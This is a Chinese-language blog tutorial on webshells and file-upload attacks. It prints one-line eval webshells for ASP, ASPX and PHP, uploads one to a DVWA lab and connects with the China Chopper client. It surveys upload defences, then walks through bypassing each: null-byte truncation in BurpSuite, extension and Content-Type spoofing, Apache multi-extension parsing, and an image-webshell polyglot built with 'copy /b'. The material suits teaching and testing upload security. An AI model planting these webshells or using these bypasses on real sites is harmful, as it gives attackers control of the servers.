---
title: 木马文件上传防御策略及几种绕过检测方式
subtitle: 
summary: 这篇文章主要介绍了菜刀的基本使用方法，总结了一些对文件上传的防御策略和绕过文件上传检测的方法
authors:
- admin
tags: ["webshell","upload","bypass"]
categories: ["Hack"]
date: "2017-03-20T00:00:00Z"
featured: false
draft: false

# Featured image
# To use, add an image named `featured.jpg/png` to your page's folder. 
image:
  caption: ""
  focal_point: ""

# Projects (optional).
#   Associate this post with one or more of your projects.
#   Simply enter your project's folder or file name without extension.
#   E.g. `projects = ["internal-project"]` references 
#   `content/project/deep-learning/index.md`.
#   Otherwise, set `projects = []`.
projects: []
---

# 0x01 中国菜刀连接

## 1. WebShell

WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WE目录下正常的网页文件混在一起，然后就可以使用浏览器或工具来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。

通常来说，上传一句话木马通过中国菜刀连接是比较简便地拿到服务器的方法。菜刀可以连接asp、aspx、php、jsp的一句话木马。

## 2. 一句话木马

- asp：

  ```asp
  <%eval request("pass")%>
  ```

- aspx:

  ```asp
  <%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>
  ```

- php:

  ```php
  <?php @eval($_POST['pass']);?>
  ```

其中，pass是这个木马中的密码的值，也可以替换为其他字符。

## 3. 一句话木马运作方式

首先，可以把这个一句话木马插入到一个正常的网站文件中，asp的插入到asp文件里，php的插入到php文件里，其他同理。也可以把木马单独写在一个文件里，比如新建一个php文件，整个php文件内容就只有这一句话。

插入的方法，一般来讲是通过文件上传功能，如作业上传网站、图片上传网站，将木马文件上传到目标网站的服务器 中，再将文件存储的链接添加到菜刀中，输入木马的密码即可直接拿到服务器的控制权。

## 4. 简单的例子

### 编写php木马

```php
<?php @eval($_POST['xxt']);?> 
```

将该php文件命名为 【xxt.php】

### 降低DVWA安全标准

因为这里主要是介绍菜刀的连接方式，为了简便使用没有防备的上传点。

在DVWA漏洞训练平台中，登陆后将DVWA的安全级别调整为low（见红框内）。调整之后选择 File Upload, 进入页面。

![img](https://pic3.zhimg.com/80/v2-381443d25db71eac8b4694a43e87bd7a_720w.png)

### 上传php木马

浏览文件，选择【xxt.php】，点击 Upload 上传。

![img](https://pic3.zhimg.com/80/v2-dd7586fe7d712c460bf4c0258a16a61a_720w.png)

上传成功，显示了文件的保存路径。前两个省略号是指父级目录，因此文件的绝对路径为

[http://127.0.0.1/dvwa-master/hackable/uploads/xxt.php](https://link.zhihu.com/?target=http%3A//127.0.0.1/dvwa-master/hackable/uploads/xxt.php)

### 菜刀连接

打开菜刀，右键—> 添加—>输入绝对路径和密码—>添加

![img](https://pic3.zhimg.com/80/v2-2ad1a31cafac7f0f47871bb86d5e272a_720w.png)

![img](https://pic1.zhimg.com/80/v2-92e754f28b20e5950617bb7586926030_720w.png)

最上方的就是我们刚添加的后门路径，双击即可查看服务器文件夹，并对其操作

![img](https://pic2.zhimg.com/80/v2-e909f9b64f937d6ca2abdf188a6a8135_720w.png)

因为这个DVWA平台是在我的本地服务器搭的，所以这里的服务器就是我自己的电脑啦

# 0x02 文件上传防御策略

## 1.  常见防御策略

在一般的网站中，是不可能直接让你上传木马文件的，都要对上传进行过滤。

通常会有文件类型限制、文件大小限制等过滤方式。文件类型限制最为常见，一般有**前台文件扩展名检测**、**服务器端扩展名检测**、**content-type 参数检测**或**文件内容检测**。

### 前台脚本检测扩展名

当用户在客户端选择文件点击上传的时候，客户端还没有向服务器发送任何消息，就对本地文件进行检测来判断是否是可以上传的类型，这种方式称为前台脚本检测扩展名。绕过前台脚本检测扩展名，就是将所要上传文件的扩展名更改为符合脚本检测规则的扩展名，通过BurpSuite工具，截取数据包，并将数据包中文件扩展名更改回原来的，达到绕过的目的。

### Content-Type文件类型检测

**Content-Type**，内容类型，是网页请求中附带的参数，用于定义网络文件的类型和网页的编码，决定文件接收方将以什么形式、什么编码读取这个文件，这就是经常看到一些Asp网页点击的结果却是下载到的一个文件或一张图片的原因。

**ContentType** 一般参数有

- application/x-cdf 应用型文件
- text/HTML 文本
- image/JPEG jpg 图片
- image/GIF gif图片

当浏览器在上传文件到服务器的时候，服务器对说上传文件的 Content-Type 类型进行检测，如果是白名单允许的，则可以正常上传，否则上传失败。绕过 Content—Type 文件类型检测，就是用 BurpSuite 截取并修改数据包中文件的 Content-Type 类型，使其符合白名单的规则，达到上传的目的。

### 服务器端扩展名检测

当浏览器将文件提交到服务器端的时候，服务器端会根据设定的黑白名单对浏览器提交上来的文件扩展名进行检测，如果上传的文件扩展名不符合黑白名单的限制，则不予上传，否则上传成功。

### 文件内容检测

一般文件内容验证使用getimagesize()函数检测，会判断文件是否是一个有效的文件图片，如果是，则允许上传，否则的话不允许上传。所以经常要将一句话木马插入到一个【合法】的图片文件当中，然后用中国菜刀远程连接。

# 0x03 绕过检测上传

## 1. 利用00截断上传绕过前台检测

比如某网站的上传点采用了前端扩展名检测，只允许上传图片文件，而我们要上传一个php木马，可以按照以下步骤

1. php木马伪装jpg文件

   先编写一个一句话木马，命名为【lubr.php.jpg】，因为扩展名检测是从文件名的右边往左读的，当读到第一个【. 】的时候，便通过扩展名确定这个文件的类型。这里就将 php 文件伪装成了jpg 文件。

2. BurpSuite拦截改2e为00

   开启 BurpSuite 的【proxy】 功能，在选择 【lubr.php.jpg】 文件后，点击上传。

   这时上传文件的数据包不会直接发往服务器，而是要经由 Burp 来发送，我们在这里可以查看和修改数据包的内容。

   点击hex查看十六进制源码，如下图

   ![img](https://pic1.zhimg.com/80/v2-7af67370ae3ba0e72478a6f9d9c190b4_720w.png)

   找到 lubr.php.jpg 对应的源码，将 lubr.php 后的【.】 对应的【2e】改为【00】

   ![img](https://pic2.zhimg.com/80/v2-38ab35d43d6572a7c8065e43573f6465_720w.png)

   【00】对应【空】 ,注意【空格Space】不等于【空】

   点击 【forward】，即可成功上传文件

3. 菜刀连接

   获取php木马的绝对路径，略

## 2. 截断改扩展名绕过前台检测

与00截断类似，此方法也是通过截断数据包做修改来实现的。

如果直接上传php文件，会被拦截。

![img](https://pic2.zhimg.com/80/v2-9ca0771bd3632f20b6d58d08cba476ed_720w.png)

1. 准备一句话木马

   先写一个php一句话木马，然后在这里命名为 lubr.jpg，而不是php文件

2. BurpSuite拦截改扩展名

   在BurpSuite中会抓到截取的数据包，在数据包中将所上传的文件后缀名由【.jpg】改为【.php】

![img](https://pic1.zhimg.com/80/v2-b816c41f5bbf6b72037452111bf22c6c_720w.png)

​	点击【forward】，传递数据包，前台即可提示，上传【lubr.php】成功

​	略

## 3.  绕过Content-Type检测文件类型上传

Content-Type如果为【application/octet-stream】，这一般是可运行程序（木马）的类型，因此会拒绝上传。但如果我们将其改为【image/gif】图片类型，可能就能够绕过该检测。

1. BurpSuite拦截改Content-Type参数

   在BurpSuite中会抓到截取的数据包，在数据包中将所上传的文件的Content-Type由【application/octet-stream】改为【image/gif】

​	![img](https://pic4.zhimg.com/80/v2-a92474b3bab37ace1d80ba8bb66725f7_720w.png)	

​	点击【forward】，传递数据包，前台即可提示，上传【lubr.php】成功

​	略

## 4. apache解析漏洞上传shell绕过服务器端扩展名检测

Apache 识别文件类型是从右向左识别的，如果如遇不认识的扩展名会向前一次识别，直到遇到能识别的扩展名**，**因为Apache认为一个文件可以拥有多个扩展名，哪怕没有文件名，也可以拥有多个扩展名。这种漏洞存在于使用module模式与php结合的所有版本的Apache。

假如某网站刚好使用了有解析漏洞版本的Apache，而且其对服务器端对【.php】文件直接上传做了过滤。

1. 一句话木马

   因为服务器端对【.php】上传做了过滤，因此无论怎么用BurpSuite修改都不能上传成功。

   如果将该木马命名为 【lubr.php.adc】，则显示上传成功。

   因为服务器端黑名单只限制了几种扩展名的上传，而其他扩展名都是合法的，不论这种扩展名是否有效，而apache却能识别无效的扩展名并不予解析，这种不对称的扩展名识别造成了上传漏洞的产生。

2. 菜刀连接

![img](https://pic1.zhimg.com/80/v2-38cc75e063bd49751e267408dac2d338_720w.png)

​	菜刀也不识别【.abc】，直接解析【.php】，连接成功。

## 5. 构造图片马绕过文件内容检测

文件内容检测脚本中getimagesize(string filename)函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错，是一种比较严的防御措施。但并不代表其牢不可破。

虽然php内容不合法，但我们可以将其伪装成一个图片，以欺骗检测脚本来进行非法上传。

1. 构造图片马

   随便找一个图片，将其与要上传的木马置于同一文件夹下

   ![img](https://pic2.zhimg.com/80/v2-a69e2e5d62aec6c57280a760497d80f1_720w.png)

   打开cmd，进入该文件夹，输入

   ```
   copy doram.jpg/b+lubr.php/a xiaoma.jpg
   ```

   将【lubr.php】插入到【doram.jpg】中。其中【xiaoma.jpg】是插入后的文件。

   用记事本打开【xiaoma.jpg】，发现木马插入到了文件最后。

   ![img](https://pic4.zhimg.com/80/v2-551a4bca6c9b4744dccf6cc662ff533f_720w.png)

2. 上传木马

   将文件名改为【xiaoma.jpg.php】，然后上传成功，菜刀连接。

   以上就是几种检测情况的绕过方法，真实情况下需各种方式配合使用。